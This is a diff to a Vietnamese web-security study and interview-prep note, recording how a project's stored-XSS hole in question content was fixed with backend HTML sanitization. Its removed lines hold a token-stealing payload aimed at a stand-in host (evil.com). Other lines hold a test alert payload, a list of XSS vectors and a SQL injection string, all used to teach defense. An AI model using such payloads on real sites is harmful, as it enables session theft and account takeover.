@@ -861,25 +861,56 @@ sách origin cụ thể từ config.
 **Keyword: Parameterized Query.** EF sinh `WHERE Email = @p0` rồi gửi giá trị riêng. SQL Server hiểu
 `@p0` là **dữ liệu**, không bao giờ là **lệnh** — user gõ `' OR 1=1 --` cũng chỉ là chuỗi vô hại.
 
-## 10.5 · ⚠️ XSS — chưa được che
+## 10.5 · ✅ XSS — ĐÃ VÁ 2026-08-06
 
 **Keyword: XSS (Cross-Site Scripting)** — chèn JS độc vào nội dung, chạy trong trình duyệt nạn nhân.
 
 React **tự escape** mọi thứ render trong JSX → miễn nhiễm XSS mặc định. **Trừ khi** dùng
-`dangerouslySetInnerHTML`.
+`dangerouslySetInnerHTML` — tên có chữ "dangerously" là **cố ý**, React muốn bạn phải suy nghĩ.
 
-> 🔴 Dự án có **15 chỗ** dùng `dangerouslySetInnerHTML` để render nội dung câu hỏi (vì CM soạn bằng
-> TipTap nên nội dung là HTML). **Không sanitize ở cả frontend lẫn backend.**
->
-> Kết hợp với **token lưu trong `localStorage`** → một CM (hoặc kẻ chiếm tài khoản CM) chèn
-> `<img src=x onerror="fetch('evil.com?t='+localStorage.token)">` vào nội dung câu hỏi là **đánh cắp
-> token của mọi user làm đề đó**.
->
-> **Cách sửa:** sanitize HTML phía **backend** lúc lưu (thư viện `HtmlSanitizer`) — không chỉ ở frontend,
-> vì frontend bỏ qua được.
+**Keyword: Stored XSS vs Reflected XSS.** *Stored* = mã độc lưu vào DB, tấn công mọi người xem sau
+đó (trường hợp này — nặng nhất). *Reflected* = mã độc trong URL, chỉ tấn công người bấm link.
 
-**Keyword: Stored XSS vs Reflected XSS.** *Stored* = mã độc lưu vào DB, tấn công mọi người xem sau đó
-(trường hợp này). *Reflected* = mã độc trong URL, chỉ tấn công người bấm link.
+**Keyword: sanitize vs escape vs validate.**
+
+| | Làm gì | `<b>Hi</b>` thành |
+|---|---|---|
+| **Escape** | `<` → `&lt;` | hiện **chữ** `<b>Hi</b>` |
+| **Sanitize** | lọc thẻ xấu, giữ thẻ tốt | hiện **Hi in đậm** |
+| **Validate** | chấp nhận / từ chối cả chuỗi | pass hoặc reject |
+
+Dự án cần **sanitize** (không phải escape) vì nội dung phải là HTML thật để hiện đậm/nghiêng/bảng.
+
+**Nguyên tắc: sanitize lúc GHI, escape lúc ĐỌC.** Lọc ở backend trước khi lưu DB — không chỉ ở
+frontend, vì frontend chạy trên máy người dùng và bỏ qua được.
+
+> ### 🎯 Câu chuyện kể được — tự tìm ra khi thử tấn công dự án của chính mình
+>
+> Thử XSS trên UI thì **chỉ luồng import Excel bị**, gõ vào rich text editor thì không. Tưởng
+> editor an toàn.
+>
+> **Lý do:** TipTap chạy trên **ProseMirror**, `StarterKit` khai báo **schema** = danh sách
+> node/mark được phép. Payload dán vào editor bị schema bỏ trước khi `getHTML()` trả về.
+>
+> **Nhưng đó là phía CLIENT.** Kiểm chứng bằng curl: `POST /api/Question` với
+> `<img src=x onerror="alert(1)">` → payload vào DB **NGUYÊN VẸN**. Excel hở vì không qua
+> ProseMirror; curl cũng không qua ProseMirror nên hở y như vậy.
+>
+> → **Editor lọc là tiện nghi phía client, không phải kiểm soát bảo mật.**
+>
+> **Cách vá:** `HtmlContentSanitizer` sanitize ở `QuestionService` — nơi **cả 3 luồng** (Create,
+> Update, Import Excel) đi qua. 11 chỗ. Sửa gốc, không vá riêng luồng Excel.
+
+**Keyword: whitelist vs blacklist.** Blacklist (`onerror`, `<script>`…) **luôn thiếu** — HTML có vô
+số cách chạy code: `<svg onload>`, `<iframe srcdoc>`, `<body onpageshow>`, `javascript:` trong
+`href`, `data:text/html`. Whitelist mặc định **từ chối**, chỉ cho qua thứ có tên trong danh sách.
+
+Đã test 10 kỹ thuật, tất cả bị chặn mà không cần biết trước từng cái. `<img>` được phép (Part 1/6/7
+cần ảnh) nhưng `onerror` thì không → `<img src=x onerror="...">` thành `<img src="x">`: ảnh lỗi,
+**không có gì chạy**.
+
+> ⚠️ **Còn nợ:** token vẫn ở `localStorage` (xem 11.1) → nếu XSS lọt lưới thì token vẫn mất.
+> Sanitize chặn ở gốc, nhưng defense-in-depth thì nên có cả hai.
 
 ## 10.6 · Secrets ⚠️
 
@@ -911,9 +942,14 @@ command-line args. Nhờ vậy production chỉ cần set env var, không cần 
 | **Memory (biến JS)** | XSS khó lấy hơn | Mất khi F5 |
 | **httpOnly cookie** | JS **không** đọc được → miễn nhiễm XSS | Phải chống CSRF, phức tạp hơn với SPA |
 
-> **Cách trả lời:** *"Em lưu localStorage cho đơn giản. Em biết đánh đổi là dính XSS thì mất token —
-> và dự án em đang có 15 chỗ `dangerouslySetInnerHTML` chưa sanitize nên rủi ro đó là thật. Cách chuẩn
-> hơn là access token giữ trong memory, refresh token trong httpOnly cookie."*
+> **Cách trả lời:** *"Em lưu localStorage cho đơn giản, và biết đánh đổi là dính XSS thì mất token.
+> Em đã đóng đường XSS ở gốc — sanitize HTML ở backend cho cả 3 luồng ghi (xem 10.5). Nhưng đó vẫn
+> là một lớp; defense-in-depth thì access token nên giữ trong memory và refresh token trong httpOnly
+> cookie, để XSS lọt lưới cũng không lấy được token. Em chưa làm vì nó đụng cả luồng auth ở
+> frontend — đang trong kế hoạch."*
+>
+> 🎯 Câu trả lời này mạnh vì nó cho thấy 3 thứ: **biết rủi ro** · **đã vá gốc** · **biết vá gốc chưa
+> đủ và vì sao chưa làm lớp thứ hai**.
 
 ## 11.2 · Axios interceptor ⚠️ — thiếu auto-refresh
 
